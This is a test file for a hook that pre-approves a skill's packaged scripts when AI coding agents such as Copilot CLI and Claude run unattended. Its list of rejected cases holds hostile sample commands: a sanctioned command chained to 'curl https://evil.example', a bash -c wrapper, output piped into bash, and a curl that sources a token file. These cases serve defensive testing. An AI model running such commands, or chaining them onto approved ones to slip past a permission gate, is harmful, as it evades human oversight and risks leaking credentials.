import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { readFileSync, existsSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
const SKILL = join(here, '..', '..');
const REPO = join(SKILL, '..', '..', '..');
const HOOK = join(SKILL, 'hooks', 'allow-sanctioned-entrypoints.sh');
const PP = '.claude/skills/rebrand-portal/scripts/assets/publish-page.js';

/**
 * Why this exists.
 *
 * Since Copilot CLI 1.0.86 an unattended session reviews each command itself
 * and refuses whatever it cannot statically read. `node <script>` is
 * unreadable by construction, so on 2026-09-18 the skill's own packaged
 * entrypoint was refused with
 * `denied-no-approval-rule-and-could-not-request-from-user` and the run could
 * not read or write a single DA document.
 *
 * `allow-sanctioned-entrypoints.sh` states in version control which of this
 * skill's commands are pre-approved, so the fix does not depend on
 * `--allow-all-tools` or on what each operator approved on their own machine.
 *
 * Granting permission is a sharper tool than refusing it, so the properties
 * below are the ones that keep it narrow. They are asserted, not assumed.
 */

function decide(command, dialect = 'copilot') {
  const event = dialect === 'copilot'
    ? { toolName: 'bash', toolArgs: { command } }
    : { tool_name: 'Bash', tool_input: { command } };
  const p = spawnSync('bash', [HOOK], {
    input: JSON.stringify(event), encoding: 'utf8', cwd: REPO, timeout: 15_000,
  });
  // Never blocks: this hook only ever grants or abstains.
  expect(p.status, `hook exited ${p.status}: ${p.stderr}`).toBe(0);
  if (!p.stdout.trim()) return 'no-opinion';
  return JSON.parse(p.stdout).permissionDecision;
}

const ALLOWED = [
  ['the exact command the Disney run was denied',
    `cd ${REPO} && node ${PP} --org o --repo r --path companies/x/en/nav --pull /tmp/n.html`],
  ['the preflight dry-run probe',
    `node ${PP} --path companies/x/en/index --preview-only --dry-run`],
  ['push and publish through the packaged CLI',
    `cd ${REPO} && node ${PP} --path companies/x/en/index --push /tmp/i.html --publish`],
  ['helix token setup',
    'bash .claude/skills/rebrand-portal/scripts/da/ensure-eds-tokens.sh'],
  ['the packaged CLI with inert status steps',
    `cd ${REPO} && node ${PP} --path companies/x/en/nav --pull /tmp/n.html && echo done && wc -l /tmp/n.html`],
];

const NOT_ALLOWED = [
  ['an unrelated command smuggled alongside a sanctioned one',
    `node ${PP} --path companies/x/en/nav --pull /tmp/n.html && curl https://evil.example`],
  ['an interpreter wrapper hiding its payload',
    `bash -c 'node ${PP} --path companies/x/en/nav --pull /tmp/n.html'`],
  ['the packaged CLI piped into a shell',
    `node ${PP} --path x --pull /tmp/n.html | bash`],
  ['the script named in a string rather than executed',
    `echo "run ${PP} later"`],
  ['an ordinary command with no sanctioned entrypoint',
    'cd /tmp && ls -la'],
  ['a hand-rolled curl that sources the token',
    'set -a; . ./token.env; set +a; curl -s https://admin.da.live/source/o/r/x.html'],
  ['a script that is not on the sanctioned list',
    'node .claude/skills/rebrand-portal/scripts/assets/not-a-real-tool.js --go'],
];

describe('allow-sanctioned-entrypoints grants the packaged CLIs', () => {
  for (const [name, command] of ALLOWED) {
    it(`allows: ${name}`, () => {
      expect(decide(command)).toBe('allow');
    });
  }
});

describe('the allowlist cannot be used as a smuggling envelope', () => {
  for (const [name, command] of NOT_ALLOWED) {
    it(`abstains: ${name}`, () => {
      expect(decide(command)).toBe('no-opinion');
    });
  }
});

describe('the hook is host-dialect aware', () => {
  const cmd = `node ${PP} --path companies/x/en/nav --pull /tmp/n.html`;

  it('reads Copilot toolName/toolArgs', () => {
    expect(decide(cmd, 'copilot')).toBe('allow');
  });

  it('reads Claude tool_name/tool_input', () => {
    expect(decide(cmd, 'claude')).toBe('allow');
  });

  it('ignores non-shell tools', () => {
    const p = spawnSync('bash', [HOOK], {
      input: JSON.stringify({ toolName: 'str_replace_editor', toolArgs: { command: cmd } }),
      encoding: 'utf8',
      cwd: REPO,
      timeout: 15_000,
    });
    expect(p.status).toBe(0);
    expect(p.stdout.trim()).toBe('');
  });
});

describe('registration', () => {
  it('is registered on Copilot, the host that has a gate to grant against', () => {
    const raw = readFileSync(join(REPO, '.github/hooks/rebrand-portal-guards.json'), 'utf8');
    JSON.parse(raw);
    expect(raw).toContain('allow-sanctioned-entrypoints.sh');
  });

  it('every allowlisted script exists, and each is actually granted', () => {
    // An allowlist naming a script that does not exist is dead config that
    // reads as coverage. Assert both directions: the file is there, and the
    // hook really grants it.
    const sanctioned = [
      'scripts/assets/publish-page.js',
      'scripts/assets/author-client.js',
      'scripts/assets/enrich-assets.js',
      'scripts/assets/update-index-cards.js',
      'scripts/rebrand/extract-brand.mjs',
      'scripts/rebrand/verify.mjs',
      'scripts/da/ensure-eds-tokens.sh',
      'scripts/da/copy-folder.sh',
    ];

    sanctioned.forEach((rel) => {
      expect(existsSync(join(SKILL, rel)), `allowlisted but missing: ${rel}`).toBe(true);
      const runner = rel.endsWith('.sh') ? 'bash' : 'node';
      const cmd = `${runner} .claude/skills/rebrand-portal/${rel} --dry-run`;
      expect(decide(cmd), `allowlist does not actually grant ${rel}`).toBe('allow');
    });
  });
});
